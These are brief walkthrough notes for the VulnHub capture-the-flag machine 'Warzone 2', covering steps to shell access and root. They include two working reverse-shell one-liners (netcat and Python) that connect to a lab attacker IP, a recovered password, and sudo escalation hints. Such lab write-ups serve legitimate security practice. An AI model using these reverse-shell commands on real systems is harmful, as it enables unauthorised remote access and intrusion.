# Warzone 2

- URL: ```https://www.vulnhub.com/entry/warzone-2,598/```
- semaphore: semaphore - signalperson
- connect 1337
- nc -e /bin/sh 192.168.0.118 4444
- flagman password: ```i_hate_signals!```
- run flask server as admiral (sudo -l)
- start remote port forwarding and connect to console
- ```import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.118",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")```
- Desktop/ - silver
- sudo -l - morze and go as root
- Desktop/ - golden
